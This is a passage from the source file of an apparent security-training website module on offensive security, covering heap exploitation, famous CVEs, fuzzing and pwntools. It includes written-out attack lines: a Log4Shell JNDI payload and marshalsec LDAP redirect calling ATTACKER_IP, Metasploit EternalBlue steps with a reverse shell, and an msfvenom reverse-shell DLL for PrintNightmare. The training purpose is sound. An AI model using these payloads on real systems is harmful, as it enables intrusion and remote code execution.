    rop.chain()         # assembled ROP chain
)

# Inspect the chain
print(rop.dump())       # Human-readable chain description`}</Pre>

        <H3>SROP (Sigreturn-Oriented Programming)</H3>
        <P>When few gadgets are available, SROP abuses the sigreturn syscall. Sigreturn restores CPU registers from a sigcontext structure on the stack. By placing a fake sigcontext on the stack and calling sigreturn, the attacker sets all registers simultaneously - only two gadgets are needed: syscall and pop rax (to set rax=15 for sigreturn).</P>
      </div>
    ),
  },

  {
    id: 'heap-exploitation',
    title: 'Heap Exploitation',
    difficulty: 'ADVANCED',
    readTime: '30 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'glibc ptmalloc2 manages heap chunks with metadata headers - corrupting this metadata redirects allocations.',
      'tcache (glibc 2.26+) is a per-thread single-linked free list; poisoning its fd pointer enables arbitrary allocation.',
      'Use-after-free occurs when code uses a freed pointer - if an attacker refills the freed chunk, they control the object.',
      'Tcache safe-linking (glibc 2.32+) XORs fd pointers with a key - requires leaking the key before poisoning.',
      'pwndbg heap commands (heap, bins, malloc_chunk) are essential for inspecting heap state during exploit development.'
    ],
    content: (
      <div>
        <Note type="warn">Heap exploitation requires a solid understanding of the allocator internals. This chapter covers glibc ptmalloc2 - the allocator used on most Linux systems. Windows uses a different heap manager (NT Heap / Segment Heap) with different internals.</Note>

        <H3>glibc Heap Chunk Structure</H3>
        <Pre label="MALLOC CHUNK LAYOUT">{`Allocated chunk:
  [prev_size - 8 bytes: size of previous chunk IF previous is free]
  [size - 8 bytes: size of this chunk + flags (PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA)]
  [user data starts here - what malloc() returns]

Free chunk (in a bin):
  [prev_size]
  [size]
  [fd - forward pointer to next free chunk in bin]
  [bk - backward pointer to previous free chunk in bin]
  [fd_nextsize] (large bins only)
  [bk_nextsize] (large bins only)`}</Pre>

        <H3>Bins - How Free Chunks are Tracked</H3>
        <Table
          headers={['BIN TYPE', 'SIZE RANGE', 'STRUCTURE', 'NOTES']}
          rows={[
            ['tcache (2.26+)', '0-1032 bytes', 'Per-thread singly-linked list, max 7 per size', 'First allocation target; least protected'],
            ['fastbin', '0-160 bytes (configurable)', 'Singly-linked LIFO list', 'No consolidation; quick reuse'],
            ['small bin', '0-1008 bytes', 'Doubly-linked FIFO list', 'Safe, coalesce on free'],
            ['large bin', '1024+ bytes', 'Doubly-linked + nextsize', 'Sorted by size'],
            ['unsorted bin', 'Any', 'Temporary holding during free', 'Checked first on allocation'],
          ]}
        />

        <H3>Use-After-Free (UAF)</H3>
        <P>After calling free(ptr), the memory is returned to the allocator but ptr still holds the old address (a dangling pointer). If the program later uses ptr without checking, and if an attacker caused a new allocation to fill the freed chunk, the attacker controls the data the program reads through the dangling pointer.</P>
        <Pre label="UAF EXPLOITATION PATTERN">{`1. Target object allocated: ptr = malloc(64)
   Object contains function pointer or vtable pointer
2. Object freed: free(ptr)
   ptr still valid in memory but chunk returned to tcache/fastbin
3. Attacker-controlled allocation: attacker_chunk = malloc(64)
   allocator returns the SAME memory (tcache is LIFO)
4. Attacker writes to attacker_chunk: fills with fake object data
5. Program uses dangling ptr -> reads attacker-controlled data
6. If program calls ptr->func() -> calls attacker-controlled function pointer`}</Pre>

        <H3>Tcache Poisoning (glibc 2.26+)</H3>
        <P>The tcache is a singly-linked list. Each free chunk's fd field points to the next free chunk of the same size. By corrupting the fd pointer of a freed chunk (via heap overflow or UAF), an attacker causes the next malloc() to return an arbitrary address.</P>
        <Pre label="TCACHE POISONING">{`# Scenario: heap overflow overwrites fd of freed tcache chunk
# tcache list: chunk_A -> chunk_B -> NULL
# Corrupt chunk_A's fd to point to TARGET_ADDRESS
# After poisoning: chunk_A -> TARGET_ADDRESS -> ???

malloc(size)   # Returns chunk_A (normal)
malloc(size)   # Returns TARGET_ADDRESS (arbitrary!)
# Now write to the returned pointer -> write anywhere in memory

# GLIBC 2.32+ SAFE-LINKING:
# fd is stored XOR'd with (address_of_chunk >> 12)
# Must leak a heap address to compute the XOR key before poisoning`}</Pre>

        <H3>Double Free</H3>
        <P>Freeing the same chunk twice corrupts the bin's linked list. In older glibc (pre-2.26 fastbin), this creates a loop in the fastbin list. In tcache (2.26+), a count check was added, but can be bypassed by freeing another chunk of the same size between the two frees.</P>

        <H3>House of Force (glibc pre-2.29)</H3>
        <P>Overwrite the top chunk size field with a very large value (0xffffffffffffffff). The next malloc() with a specially crafted size causes the top chunk pointer to wrap around to any address in memory, causing the following allocation to return an arbitrary address.</P>

        <H3>pwndbg Heap Commands</H3>
        <Pre label="PWNDBG HEAP INSPECTION">{`(gdb) heap              # Show all heap chunks
(gdb) bins              # Show all bin contents (tcache, fastbin, etc.)
(gdb) malloc_chunk addr # Decode chunk at address
(gdb) vis_heap_chunks   # Visual heap layout
(gdb) tcachebins        # Show tcache per-thread bins
(gdb) fastbins          # Show fastbin contents`}</Pre>
      </div>
    ),
  },

  {
    id: 'web-network-exploitation',
    title: 'Web and Network Exploitation',
    difficulty: 'INTERMEDIATE',
    readTime: '24 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'Log4Shell (CVE-2021-44228) exploits JNDI lookup in log messages to trigger LDAP callback and RCE payload delivery.',
      'EternalBlue (MS17-010) exploits an SMB buffer overflow; it is the basis of WannaCry and NotPetya ransomware.',
      'PrintNightmare (CVE-2021-1675) provides both local privilege escalation and remote code execution via Print Spooler.',
      'Distinguishing exploiting vulnerabilities from exploiting misconfigurations is important for accurate pentest reporting.',
      'BlueKeep and Log4Shell represent critical unauthenticated RCE in widely-deployed services - always check version numbers.'
    ],
    content: (
      <div>
        <H3>Metasploit Web and Network Modules</H3>
        <P>Metasploit includes thousands of exploit modules for web services and network protocols. Categories:</P>
        <Pre label="METASPLOIT MODULE CATEGORIES">{`auxiliary/scanner/http/*   # HTTP scanning (dir enum, vuln detection)
auxiliary/scanner/smb/*    # SMB enumeration and vulnerability scanning
exploit/multi/http/*       # Cross-platform web exploits
exploit/windows/smb/*      # Windows SMB exploits (EternalBlue, etc.)
exploit/linux/http/*       # Linux web application exploits`}</Pre>

        <H3>Log4Shell - CVE-2021-44228</H3>
        <P>Log4Shell is a critical RCE vulnerability in Apache Log4j 2 (versions 2.0-beta9 to 2.14.1). The Log4j library evaluates JNDI expressions in logged strings. An attacker controls a logged value (User-Agent, username, any logged field) and injects a JNDI lookup string.</P>
        <Pre label="LOG4SHELL EXPLOITATION CHAIN">{`1. INJECT: Send HTTP request with header:
   User-Agent: ${'{'}jndi:ldap://ATTACKER_IP:1389/Exploit{'}'}
   (Any logged field works - username, X-Forwarded-For, search query, etc.)

2. LOG4J EVALUATES the JNDI expression, connects to attacker LDAP server

3. ATTACKER LDAP (marshalsec):
   java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"

4. LDAP REDIRECTS to attacker HTTP server hosting malicious Java class

5. LOG4J DOWNLOADS AND EXECUTES the Java class -> RCE as the Java process user

Affected versions: Log4j 2.0-beta9 through 2.14.1
Fix: Log4j 2.15.0+ (JNDI lookups disabled by default)
Partial fix: log4j2.formatMsgNoLookups=true (JVM property)`}</Pre>

        <H3>EternalBlue - MS17-010</H3>
        <P>EternalBlue exploits a buffer overflow in the Windows SMB (Server Message Block) protocol implementation. The exploit was leaked from the NSA by Shadow Brokers in 2017 and weaponised in WannaCry and NotPetya ransomware within weeks.</P>
        <Pre label="ETERNALBLUE IN METASPLOIT">{`msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS TARGET_IP
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST ATTACKER_IP
msf> run
# Requires SMB port 445 accessible and target unpatched (no MS17-010 patch)
# Works on: Windows 7, 8.1, 2008 R2, 2012, 2016 (unpatched)`}</Pre>

        <H3>PrintNightmare - CVE-2021-1675 / CVE-2021-34527</H3>
        <P>PrintNightmare is a vulnerability in the Windows Print Spooler service (spoolsv.exe) running as SYSTEM. There are two variants: local privilege escalation (LPE) and remote code execution (RCE). Both involve adding a malicious printer driver via the AddPrinterDriverEx() or RpcAddPrinterDriverEx() Windows API call.</P>
        <Pre label="PRINTNIGHTMARE (LPE VIA POWERSHELL)">{`# Import-Module PrintNightmare.ps1 (PoC)
# Create DLL payload with msfvenom:
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll

# Local privilege escalation path:
# Any low-privilege user can add printer drivers pointing to DLL
# Spooler loads DLL as SYSTEM -> code execution as SYSTEM`}</Pre>

        <H3>Critical Vulnerabilities Quick Reference</H3>
        <Table
          headers={['CVE', 'NAME', 'COMPONENT', 'IMPACT', 'AUTH REQUIRED']}
          rows={[
            ['CVE-2021-44228', 'Log4Shell', 'Apache Log4j 2', 'RCE', 'None'],
            ['CVE-2017-0144', 'EternalBlue', 'Windows SMB v1', 'RCE as SYSTEM', 'None'],
            ['CVE-2019-0708', 'BlueKeep', 'Windows RDP', 'RCE as SYSTEM', 'None (pre-auth)'],
            ['CVE-2021-34527', 'PrintNightmare', 'Windows Print Spooler', 'LPE + RCE as SYSTEM', 'Low (any user)'],
            ['CVE-2021-4034', 'PwnKit', 'polkit pkexec (Linux)', 'LPE to root', 'Any local user'],
            ['CVE-2022-0847', 'DirtyPipe', 'Linux kernel pipe', 'LPE to root, overwrite read-only files', 'Any local user'],
            ['CVE-2022-22965', 'Spring4Shell', 'Spring Framework', 'RCE', 'None'],
            ['CVE-2014-6271', 'Shellshock', 'Bash env variable', 'RCE via CGI', 'Depends on target'],
            ['CVE-2014-0160', 'Heartbleed', 'OpenSSL TLS', 'Memory disclosure (private keys)', 'None'],
          ]}
        />
      </div>
    ),
  },

  {
    id: 'fuzzing',
    title: 'Fuzzing and Vulnerability Discovery',
    difficulty: 'ADVANCED',
    readTime: '26 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'Coverage-guided fuzzing (AFL++, libFuzzer) uses instrumentation to guide mutation toward unexplored code paths.',
      'Sanitizers (ASan, UBSan, MSan) are essential companions to fuzzing - they catch memory errors that would otherwise be silent.',
      'AFL++ persistent mode keeps the target in memory between fuzz iterations, achieving millions of executions per second.',
      'Ghidra and IDA Pro are the primary static analysis platforms - IDA is the industry standard, Ghidra is the free alternative.',
      'angr performs symbolic execution to find inputs that reach specific code paths without running the binary.'
    ],
    content: (
      <div>
        <H3>Fuzzing Fundamentals</H3>
        <P>Fuzzing is the automated technique of sending malformed, unexpected, or random inputs to a target to cause crashes, which indicate bugs. Crashes are then triaged to determine exploitability.</P>
        <Table
          headers={['FUZZING TYPE', 'APPROACH', 'KNOWLEDGE NEEDED', 'TOOLS']}
          rows={[
            ['Black-box', 'No access to source code or binary internals; purely IO-based', 'None of target internals', 'boofuzz, radamsa'],
            ['Grey-box', 'Binary instrumentation to measure code coverage; guides mutation', 'Binary access only', 'AFL++, Honggfuzz'],
            ['White-box', 'Full source access; symbolic execution or static analysis-guided', 'Full source', 'KLEE, S2E, angr'],
            ['Generation-based', 'Knows the input format/grammar; generates valid-but-malformed inputs', 'Protocol specification', 'boofuzz, Peach Fuzzer'],
            ['Mutation-based', 'Takes valid seed inputs and mutates them', 'Valid sample inputs', 'AFL++, libFuzzer'],
          ]}
        />

        <H3>AFL++ - Coverage-Guided Fuzzing</H3>
        <Pre label="AFL++ SETUP AND WORKFLOW">{`# Install AFL++
sudo apt install afl++
# or build from source: git clone https://github.com/AFLplusplus/AFLplusplus

# Instrument target with AFL compiler
CC=afl-clang-fast CXX=afl-clang-fast++ ./configure
make

# Or instrument without source (QEMU mode for binary-only):
AFL_USE_QEMU=1 afl-fuzz -Q -i corpus/ -o findings/ -- ./binary @@

# Basic run (source instrumented):
mkdir corpus findings
echo "normal input" > corpus/seed1
afl-fuzz -i corpus/ -o findings/ -- ./binary @@
# @@ is replaced with each test case file path

# Parallel fuzzing (4 cores):
afl-fuzz -M main -i corpus/ -o findings/ -- ./binary @@   # Master
afl-fuzz -S slave1 -i corpus/ -o findings/ -- ./binary @@ # Worker 1
afl-fuzz -S slave2 -i corpus/ -o findings/ -- ./binary @@ # Worker 2

# Triage crashes:
ls findings/default/crashes/
# Run each crash: ./binary findings/default/crashes/id:000000,...
# Use afl-triage or minimise with afl-tmin`}</Pre>

        <H3>libFuzzer - In-Process Fuzzing</H3>
        <Pre label="LIBFUZZER TARGET STRUCTURE">{`// Compile with: clang -fsanitize=fuzzer,address target.c -o fuzz_target
// Run: ./fuzz_target corpus/ -max_total_time=3600

#include <stdint.h>
#include <stddef.h>

// libFuzzer calls this function with each fuzz input
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Call the function you want to fuzz:
    parse_user_input(data, size);
    return 0;  // Non-zero return = crash
}

// ALWAYS compile with sanitizers:
// -fsanitize=address     AddressSanitizer - heap/stack/global buffer overflows
// -fsanitize=undefined   UndefinedBehaviorSanitizer - integer overflow, alignment
// -fsanitize=memory      MemorySanitizer - uninitialised reads (Clang only)`}</Pre>

        <H3>boofuzz - Network Protocol Fuzzing</H3>
        <Pre label="BOOFUZZ BASIC STRUCTURE">{`from boofuzz import Session, Target, TCPSocketConnection, s_initialize, s_string, s_delim, s_static

session = Session(
    target=Target(connection=TCPSocketConnection("TARGET_IP", 21))
)

s_initialize("FTP USER command")
s_string("USER")
s_delim(" ")
s_string("anonymous")   # This string will be fuzzed
s_static("\\r\\n")

session.connect(s_get("FTP USER command"))
session.fuzz()`}</Pre>

        <H3>Ghidra - NSA Decompiler</H3>
        <P>Ghidra is a free, open-source reverse engineering suite released by the NSA in 2019. It includes a disassembler, decompiler, and scripting API (Java and Python). Essential for vulnerability research and malware analysis.</P>
        <Pre label="GHIDRA WORKFLOW">{`1. Launch: ghidraRun (GUI) or analyzeHeadless for scripting
2. New Project -> Import File -> select binary
3. Analysis: let auto-analysis run (10-60 seconds)
4. CodeBrowser: main analysis window
   - Symbol Tree: functions, labels, imports, exports
   - Listing View: disassembly
   - Decompiler: C pseudocode for selected function
5. Find main/entry: Search -> For Symbol -> main
6. Cross-references (xrefs): right-click symbol -> References -> Show References To
7. Rename functions: press 'L' on selected function
8. Apply struct: right-click variable in decompiler -> Data Type

Scripting (Python via Jython):
  Script Manager -> New Script -> Python
  getCurrentProgram().getMemory()
  getFunctionManager().getFunctions(True)  # iterate all functions`}</Pre>

        <H3>Binary Analysis Tools Comparison</H3>
        <Table
          headers={['TOOL', 'TYPE', 'COST', 'STRENGTHS']}
          rows={[
            ['IDA Pro', 'Disassembler + Decompiler (Hex-Rays)', 'Commercial (thousands USD)', 'Industry standard, FLIRT sigs, IDAPython, best decompiler quality'],
            ['Ghidra', 'Disassembler + Decompiler', 'Free (NSA)', 'Good decompiler, scripting, open source, plugin ecosystem'],
            ['Binary Ninja', 'Disassembler + Decompiler', 'Commercial (affordable)', 'Clean API, MLIL intermediate language, good for automation'],
            ['angr', 'Symbolic execution framework', 'Free (Python)', 'Automated vulnerability discovery, path exploration, CTF use'],
            ['radare2', 'Disassembler + debugger', 'Free', 'Scriptable, powerful CLI, Cutter GUI available'],
          ]}
        />

        <H3>pwntools Complete Reference for CTF Exploitation</H3>
        <Pre label="PWNTOOLS ESSENTIALS">{`from pwn import *

# Connect to target
p = process('./binary')          # Local process
p = remote('HOST', PORT)         # Remote TCP
p = gdb.debug('./binary', 'b main')  # With GDB attached

# Sending and receiving
p.send(b'data')                  # Send raw bytes
p.sendline(b'command')           # Send + newline
p.sendlineafter(b'prompt:', b'input')  # Wait for prompt then send
output = p.recv(1024)            # Receive up to 1024 bytes
line = p.recvline()              # Receive until newline
p.recvuntil(b'marker')          # Receive until marker

# ELF and library symbols
elf = ELF('./binary')
libc = ELF('./libc.so.6')
print(hex(elf.sym['main']))
print(hex(elf.got['puts']))      # GOT entry for puts
print(hex(elf.plt['puts']))      # PLT entry for puts

# Packing/unpacking
payload = p64(0xdeadbeef)        # Pack as 64-bit little-endian
value = u64(data[:8])            # Unpack 8 bytes to integer
payload = flat(b'A'*40, p64(addr1), p64(addr2))

# Interactive shell
p.interactive()                  # Drop to interactive mode`}</Pre>
      </div>
    ),
  },
]

export default function OffensivePage() {
  return (
    <div style={{ maxWidth: '960px', margin: '0 auto', padding: '2rem 1.5rem', fontFamily: mono }}>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/crypto" style={{ color: '#5a7a5a', textDecoration: 'none' }}>MOD-03</Link>
        <span>›</span>
        <span style={{ color: accent }}>MOD-04 // OFFENSIVE SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <Link href="/modules/active-directory" style={{ color: '#5a7a5a', textDecoration: 'none', fontSize: '0.65rem' }}>MOD-05 ›</Link>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 04 · OFFENSIVE SECURITY</div>
        <h1 style={{ fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', lineHeight: 1.1, textShadow: '0 0 20px ' + accent + '44' }}>
          OFFENSIVE SECURITY
        </h1>
        <p style={{ color: '#5a7a5a', fontSize: '0.75rem', lineHeight: 1.6 }}>
          Vulnerability research · Exploitation fundamentals · Stack overflows · Modern mitigations · ROP · Heap exploitation · Web/network exploits · Fuzzing
        </p>
      </div>

      {/* Chapter overview stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '12px', marginBottom: '2.5rem' }}>
        {[
          ['8', 'CHAPTERS'],
          ['~2.8hr', 'TOTAL READ'],
          ['INTERMEDIATE', 'DIFFICULTY'],
          ['MOD-04', 'IDENTIFIER'],
        ].map(([val, label], i) => (
          <div key={i} style={{ background: 'rgba(191,95,255,0.04)', border: '1px solid rgba(191,95,255,0.15)', borderRadius: '6px', padding: '1rem', textAlign: 'center' }}>
            <div style={{ fontFamily: mono, fontSize: '1.2rem', fontWeight: 700, color: accent }}>{val}</div>
            <div style={{ fontFamily: mono, fontSize: '0.6rem', color: '#3a1a4a', letterSpacing: '0.15em', marginTop: '2px' }}>{label}</div>
          </div>
        ))}
      </div>

      <ModuleCodex moduleId="offensive" accent={accent} chapters={chapters} />

      {/* Bottom navigation */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #140020' }}>
        <div style={{ background: 'rgba(191,95,255,0.04)', border: '1px solid rgba(191,95,255,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: mono, fontSize: '0.65rem', color: '#3a1a4a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: mono, fontSize: '1rem', color: accent, marginBottom: '0.5rem', fontWeight: 600 }}>MOD-04 Interactive Lab</div>
          <div style={{ fontFamily: mono, fontSize: '0.75rem', color: '#3a1a4a', marginBottom: '1.5rem' }}>20 steps &middot; 400 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/offensive/lab" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.85rem', color: accent, padding: '12px 32px', border: '1px solid rgba(191,95,255,0.6)', borderRadius: '6px', background: 'rgba(191,95,255,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(191,95,255,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/crypto" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#3a1a4a' }}>&#8592; MOD-03: CRYPTO</Link>
          <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#3a1a4a' }}>MOD-05: ACTIVE DIRECTORY &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
